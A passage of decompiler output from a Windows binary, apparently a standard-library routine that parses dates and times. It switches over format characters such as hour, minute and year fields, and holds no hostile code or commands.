in_stack_fffffffffffffe34 & 0xffffff00 | uVar4;\n                            uStackY576 = 0x14006802d;\n                            uVar9 = (**(**pauVar36 + 0x48))(pauVar36);\n                            uVar4 = in_stack_fffffffffffffe34;\n                        }\n                        bVar35 = false;\n                        uVar32 = uVar4;\n                        if (uVar9 != -1) goto code_r0x000140067d80;\n                        pauVar36 = NULL;\n                        uVar32 = 0;\n                        uStack392 = 0;\n                        uStack388 = 0;\n                        uVar9 = uVar9 & 0xffffff00 | (piVar34 != NULL && bVar38);\n                        uVar5 = 0;\n                        if (piVar34 == NULL || !bVar38) goto code_r0x000140067d91;\ncode_r0x000140067e48:\n                        uVar32 = uVar5;\n                        ppauVar12 = uVar9;\n                        if (piVar34[2] < piVar34[3]) {\n                            iVar6 = *piVar34[2];\n                        }\n                        else {\n                            in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | uVar32;\n                            uStackY576 = 0x140068016;\n                            iVar6 = (**(*piVar34 + 0x48))(piVar34);\n                            uVar32 = in_stack_fffffffffffffe34;\n                        }\n                        if (iVar6 == -1) {\n                            uStack408 = 0;\n                            uStack404 = 0;\n                            piVar34 = NULL;\n                        }\n                        else {\n                            ppauVar12 = NULL;\n                        }\n                    }\n                    else {\ncode_r0x000140067d80:\n                        uVar4 = bVar35;\n                        bVar35 = piVar34 != NULL && bVar38;\n                        uVar9 = uVar9 & 0xffffff00 | bVar35;\n                        uVar5 = uVar32;\n                        if (bVar35) goto code_r0x000140067e48;\ncode_r0x000140067d91:\n                        ppauVar12 = unaff_RSI & 0xffffff00 | bVar38;\n                    }\n                    if (uVar4 == ppauVar12) goto code_r0x000140067c0d;\n                    if (uVar32 != 0) {\n                        if (*pauVar36[1] < *(pauVar36[1] + 8)) {\n                            iVar6 = **pauVar36[1];\n                        }\n                        else {\n                            uStackY576 = 0x140068049;\n                            iVar6 = (**(**pauVar36 + 0x48))(pauVar36);\n                        }\n                        if (iVar6 == -1) {\n                            uStack392 = 0;\n                            uStack388 = 0;\n                            pauVar36 = NULL;\n                        }\n                    }\n                    uStackY576 = 0x140067db7;\n                    cVar3 = (**(*ppauVar13)[1])(ppauVar13);\n                    if (cVar3 == '\\0') goto code_r0x000140067c0d;\n                    if (*pauVar36[1] < *(pauVar36[1] + 8)) {\n                        iVar15 = *pauVar36[1] + 2;\n                        *pauVar36[1] = iVar15;\n                    }\n                    else {\n                        uStackY576 = 0x140067f31;\n                        iVar15 = (**(**pauVar36 + 0x50))(pauVar36);\n                    }\n                    ppauVar29 = 0xffffffff;\n                    uStack384 = 0xffff;\n                } while( true );\n            }\n            cVar3 = pauVar36 != NULL;\n            uStackY576 = 0x140067b89;\n            uVar9 = (**(*ppauVar13)[4])(ppauVar13);\n            arg1_02 = uVar9;\n            bVar35 = bVar37 && cVar3;\n            if (bVar35) {\n                if (*pauVar36[1] < *(pauVar36[1] + 8)) {\n                    iVar6 = **pauVar36[1];\n                    cVar3 = bVar35;\n                }\n                else {\n                    in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | bVar35;\n                    uStackY576 = 0x1400695ed;\n                    iVar6 = (**(**pauVar36 + 0x48))(pauVar36);\n                    cVar3 = in_stack_fffffffffffffe34;\n                }\n                if (iVar6 == -1) {\n                    uStack392 = 0;\n                    uStack388 = 0;\n                    cVar3 = '\\0';\n                    pauVar36 = NULL;\n                }\n            }\n            uStackY576 = 0x140067ba4;\n            iVar6 = (**(*ppauVar13)[4])(ppauVar13);\n            if (uVar9 == iVar6) {\ncode_r0x000140067d40:\n                ppauVar29 = 0xffffffff;\n                uStackY576 = 0x140067d4d;\n                fcn.14009c0a0(pauVar36);\n                piVar34 = CONCAT44(uStack404, uStack408);\n                uStack384 = 0xffff;\n            }\n            else {\n                uStackY576 = 0x140067bbc;\n                uVar9 = (**(*ppauVar13)[3])(ppauVar13);\n                arg1_02 = uVar9;\n                if ((bVar37) && (cVar3 != '\\0')) {\n                    if (*pauVar36[1] < *(pauVar36[1] + 8)) {\n                        iVar6 = **pauVar36[1];\n                    }\n                    else {\n                        uStackY576 = 0x140068546;\n                        iVar6 = (**(**pauVar36 + 0x48))(pauVar36);\n                    }\n                    if (iVar6 == -1) {\n                        uStack392 = 0;\n                        uStack388 = 0;\n                    }\n                }\n                uStackY576 = 0x140067bd9;\n                iVar6 = (**(*ppauVar13)[3])(ppauVar13);\n                pauVar36 = CONCAT44(uStack388, uStack392);\n                if (uVar9 == iVar6) goto code_r0x000140067d40;\n                uVar42 = 4;\n                pauVar36 = CONCAT44(uStack388, uStack392);\n                uStack368 = 4;\n                piVar34 = CONCAT44(uStack404, uStack408);\n            }\n            goto code_r0x000140067c0d;\n        }\n        iVar17 = 0;\n        uStackY576 = 0x140067cfb;\n        ppauVar25 = ppauVar13;\n        cVar3 = (**(*ppauVar13)[6])();\n        uStack364 = 0;\n        if ((cVar3 == 'E') || (cVar3 == 'O')) {\n            iVar17 = 0;\n            uVar33 = uVar33 + 2;\n            uStackY576 = 0x140067eef;\n            ppauVar25 = ppauVar13;\n            cVar3 = (**(*ppauVar13)[6])();\n            uVar32 = cVar3 - 0x25;\n            pauVar36 = auStack424;\n            auVar40 = extraout_XMM0_00;\n            if (uVar32 < 0x55) goto code_r0x000140067d25;\ncode_r0x000140067efa:\n            uStack368 = 4;\n            pauVar36 = CONCAT44(uStack388, uStack392);\n            uVar42 = 4;\n            goto code_r0x000140067f18;\n        }\n        uVar32 = cVar3 - 0x25;\n        uVar33 = uVar33 + 1;\n        pauVar36 = auStack424;\n        auVar40 = extraout_XMM0;\n        if (0x54 < uVar32) goto code_r0x000140067efa;\ncode_r0x000140067d25:\n        uVar19 = SUB168(in_stack_fffffffffffffe38 >> 0x40, 0);\n        iVar11 = *(uVar32 * 4 + 0x14010bd78);\n        iVar16 = iVar11;\n        arg1_01 = iVar16 + 0x14010bd78;\n        uVar4 = arg1_01;\n        iVar10 = arg1_01;\n        uVar41 = in_stack_fffffffffffffdf8 >> 0x20;\n        arg1_00 = arg1_01;\n        auStack424 = pauVar36;\n    // switch table (85 cases) at 0x14010bd78\n        switch(uVar32) {\n        case 0:\n            uStackY576 = 0x140068618;\n            iVar6 = fcn.140029f90(&stack0xfffffffffffffe78);\n            uStackY576 = 0x140068629;\n            iVar8 = (**(*ppauVar13)[5])(ppauVar13);\n            auStack424 = pauVar36;\n            if (iVar6 == iVar8) {\n                pauVar36 = CONCAT44(uStack388, uStack392);\n                ppauVar29 = 0xffffffff;\n                uStackY576 = 0x14006969b;\n                fcn.14009c0a0(pauVar36);\n                auStack424 = 0xffffffff;\n                uStack384 = 0xffff;\n            }\n            else {\ncode_r0x000140068632:\n                ppauVar29 = uStack384;\n                uStack368 = 4;\n                pauVar36 = CONCAT44(uStack388, uStack392);\n                uVar42 = 4;\n            }\n            break;\n        default:\n            goto code_r0x000140067efa;\n        case 0x1c:\n        case 0x3c:\n            iVar15 = *(arg_70h + 0x10);\n            uStack312 = *(iVar15 + 0x88);\n            uStack308 = *(iVar15 + 0x8c);\n            uStack304 = *(iVar15 + 0x90);\n            uStack300 = *(iVar15 + 0x94);\n            ppauStack296 = *(iVar15 + 0x98);\n            uStack288 = *(iVar15 + 0xa0);\n            uStack284 = *(iVar15 + 0xa4);\n            uStack344 = *(iVar15 + 0x68);\n            uStack340 = *(iVar15 + 0x6c);\n            uStack336 = *(iVar15 + 0x70);\n            uStack332 = *(iVar15 + 0x74);\n            uStack328 = *(iVar15 + 0x78);\n            uStack324 = *(iVar15 + 0x7c);\n            uStack320 = *(iVar15 + 0x80);\n            uStack316 = *(iVar15 + 0x84);\n            in_XMM1 = *(iVar15 + 0xa8);\n            uStack264 = *(iVar15 + 0xb8);\n            uStack260 = *(iVar15 + 0xbc);\n            uStack256 = *(iVar15 + 0xc0);\n            uStack252 = *(iVar15 + 0xc4);\n            pauStack360 = *(iVar15 + 0x58);\n            piStack352 = *(iVar15 + 0x60);\n            in_stack_fffffffffffffe08 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = NULL;\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x14006843a;\n            auStack280 = in_XMM1;\n            fcn.140066d40(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38, \n                          &stack0xfffffffffffffe94, &stack0xfffffffffffffe98, 0xe, in_stack_00000028, \n                          in_stack_fffffffffffffe08, in_stack_fffffffffffffe10, uVar14, noname_11, arg_70h, \n                          CONCAT44(in_stack_fffffffffffffe34, uVar42), CONCAT44(uStack404, uStack408), \n                          SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 3) = uStack364 % 7;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n            }\n            break;\n        case 0x1d:\n        case 0x3d:\n        case 0x43:\n            iVar15 = *(arg_70h + 0x10);\n            uStack264 = *(iVar15 + 0x128);\n            uStack260 = *(iVar15 + 300);\n            uStack256 = *(iVar15 + 0x130);\n            uStack252 = *(iVar15 + 0x134);\n            uStack248 = *(iVar15 + 0x138);\n            uStack244 = *(iVar15 + 0x13c);\n            uStack240 = *(iVar15 + 0x140);\n            uStack236 = *(iVar15 + 0x144);\n            uStack232 = *(iVar15 + 0x148);\n            uStack228 = *(iVar15 + 0x14c);\n            uStack224 = *(iVar15 + 0x150);\n            uStack220 = *(iVar15 + 0x154);\n            auStack216 = *(iVar15 + 0x158);\n            in_XMM1 = *(iVar15 + 0x168);\n            uStack184 = *(iVar15 + 0x178);\n            uStack180 = *(iVar15 + 0x17c);\n            uStack176 = *(iVar15 + 0x180);\n            uStack172 = *(iVar15 + 0x184);\n            ppauStack296 = *(iVar15 + 0x108);\n            uStack288 = *(iVar15 + 0x110);\n            uStack284 = *(iVar15 + 0x114);\n            auStack280 = *(iVar15 + 0x118);\n            uStack344 = *(iVar15 + 0xd8);\n            uStack340 = *(iVar15 + 0xdc);\n            uStack336 = *(iVar15 + 0xe0);\n            uStack332 = *(iVar15 + 0xe4);\n            uStack328 = *(iVar15 + 0xe8);\n            uStack324 = *(iVar15 + 0xec);\n            uStack320 = *(iVar15 + 0xf0);\n            uStack316 = *(iVar15 + 0xf4);\n            uStack312 = *(iVar15 + 0xf8);\n            uStack308 = *(iVar15 + 0xfc);\n            uStack304 = *(iVar15 + 0x100);\n            uStack300 = *(iVar15 + 0x104);\n            pauStack360 = *(iVar15 + 200);\n            piStack352 = *(iVar15 + 0xd0);\n            in_stack_fffffffffffffe08 = &stack0xfffffffffffffe90;\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            in_stack_fffffffffffffdf8 = NULL;\n            uStackY576 = 0x1400681cd;\n            auStack200 = in_XMM1;\n            fcn.140066d40(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38, \n                          &stack0xfffffffffffffe94, &stack0xfffffffffffffe98, 0x18, in_stack_00000028, \n                          in_stack_fffffffffffffe08, in_stack_fffffffffffffe10, uVar14, noname_11, arg_70h, \n                          CONCAT44(in_stack_fffffffffffffe34, uVar42), CONCAT44(uStack404, uStack408), \n                          SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 2) = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 0x408;\n            }\n            break;\n        case 0x1e:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 99);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140069166;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000048 = *in_stack_00000048 | 0x480;\n                *(in_stack_00000048 + 4) = uStack364;\n                arg1_02 = in_stack_00000048;\n            }\n            break;\n        case 0x1f:\n            uStackY576 = 0x1400692b1;\n            (**((*ppauVar13)[5] + 8))(ppauVar13, 0x14010bd5e, \"%H:%M\", &stack0xfffffffffffffe98);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            goto code_r0x0001400686a0;\n        case 0x23:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x17);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140069239;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 1) = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x24:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0xc);\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140069569;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 1) = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 1;\n            }\n            break;\n        case 0x28:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x3b);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x14006949b;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 4) = uStack364;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x2d:\n            uStackY576 = 0x1400693dc;\n            (**((*ppauVar13)[5] + 8))(ppauVar13, \"%H:%M\", 0x14010bd6d, &stack0xfffffffffffffe98);\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            goto code_r0x000140068594;\n        case 0x2e:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x3c);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140069370;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000038 = uStack364;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x2f:\n            uStackY576 = 0x1400690a7;\n            (**((*ppauVar13)[5] + 8))(ppauVar13, 0x14010bd6d, 0x14010bd76, &stack0xfffffffffffffe98);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            goto code_r0x000140068594;\n        case 0x30:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x35);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140068c3b;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe34 = *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x20 | in_stack_fffffffffffffe34 & 0xffc0ffdf;\n                arg1_02 = in_stack_00000048;\n            }\n            break;\n        case 0x32:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x35);\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140068b4b;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe34 = *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x40 | in_stack_fffffffffffffe34 & 0xffc0ffbf;\n                arg1_02 = in_stack_00000048;\n            }\n            break;\n        case 0x33:\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            goto code_r0x000140068594;\n        case 0x34:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 9999);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140068a11;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 0x14) = uStack364 - 0x76c;\n                in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xf9 | 4;\n                arg1_02 = in_stack_00000048;\n            }\n            break;\n        case 0x35:\n            uStackY576 = 0x140068738;\n            fcn.140029f90(&stack0xfffffffffffffe78);\n            auStack424 = *ppauVar13;\n            uStackY576 = 0x14006874c;\n            cVar3 = (**auStack424[1])(ppauVar13);\n            if (cVar3 == '\\0') goto code_r0x000140068632;\n            pauVar36 = &stack0xfffffffffffffe38;\n            ppauVar12 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = NULL;\n            arg1_02 = &stack0xfffffffffffffe98;\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x1400687e4;\n            in_stack_fffffffffffffe08 = ppauVar12;\n            noname_11 = pauVar36;\n            fcn.140066d40(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, pauVar36, arg1_02, *0x14010ff10, 0xe\n                          , in_stack_00000028, ppauVar12, in_stack_fffffffffffffe10, uVar14, pauVar36, arg_70h, \n                          CONCAT44(in_stack_fffffffffffffe34, uVar42), CONCAT44(uStack404, uStack408), \n                          SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            uStackY576 = 0x14006880f;\n            cVar3 = fcn.140029ee0(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n            uVar42 = uStack368;\n            if ((cVar3 == '\\0') && ((uStack368 | pauStack360) == 0)) {\n                uStackY576 = 0x140068837;\n                iVar6 = fcn.140029f90(&stack0xfffffffffffffe78);\n                uStackY576 = 0x140068848;\n                iVar8 = (**(*ppauVar13)[5])(ppauVar13, 0x2d);\n                uVar41 = in_stack_fffffffffffffdf8 >> 0x20;\n                if (iVar6 != iVar8) {\n                    uStackY576 = 0x140068855;\n                    iVar6 = fcn.140029f90(&stack0xfffffffffffffe78);\n                    uStackY576 = 0x140068866;\n                    iVar8 = (**(*ppauVar13)[5])(ppauVar13);\n                    uVar41 = in_stack_fffffffffffffdf8 >> 0x20;\n                    if (iVar6 != iVar8) goto code_r0x00014006851b;\n                }\n                pauVar36 = noname_11;\n                uStackY576 = 0x1400688d9;\n                noname_11 = pauVar36;\n                fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, pauVar36);\n                in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x3b);\n                in_stack_fffffffffffffe38 =\n                     CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n                uStack384 = uStack416;\n                uStack392 = SUB164(_auStack424, 0);\n                uStack388 = SUB164(_auStack424 >> 0x20, 0);\n                auStack440 = CONCAT48(CONCAT22(uStack382, uStack416), auStack424);\n                auStack440_00 = CONCAT412(uStack380, auStack440);\n                uStackY576 = 0x14006895e;\n                in_stack_fffffffffffffe08 = in_stack_00000028;\n                in_stack_fffffffffffffe10 = ppauVar12;\n                fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, pauVar36);\n                uStack384 = uStack416;\n                uStack392 = SUB164(_auStack424, 0);\n                uStack388 = SUB164(_auStack424 >> 0x20, 0);\n                uVar42 = uStack368;\n            }\n            goto code_r0x00014006851b;\n        case 0x3e:\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\ncode_r0x0001400686a0:\n            uStackY576 = 0x1400686e1;\n            in_stack_fffffffffffffdf8 = in_stack_00000038;\n            in_stack_fffffffffffffe08 = in_stack_00000048;\n            fcn.1400679d0(&stack0xfffffffffffffe58, arg2);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n            }\n            break;\n        case 0x3f:\n        case 0x40:\n            uStackY576 = 0x140068255;\n            uVar7 = fcn.140029f90(&stack0xfffffffffffffe78);\n            uStackY576 = 0x140068269;\n            cVar3 = (**(*ppauVar13)[1])(ppauVar13, 0x20, uVar7);\n            if (cVar3 != '\\0') {\n                uStackY576 = 0x140069674;\n                fcn.14009c0a0(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffff;\n            }\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x1f);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            uStackY576 = 0x1400682f2;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 0xc) = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 0x410;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x45:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0x16e);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140068e47;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            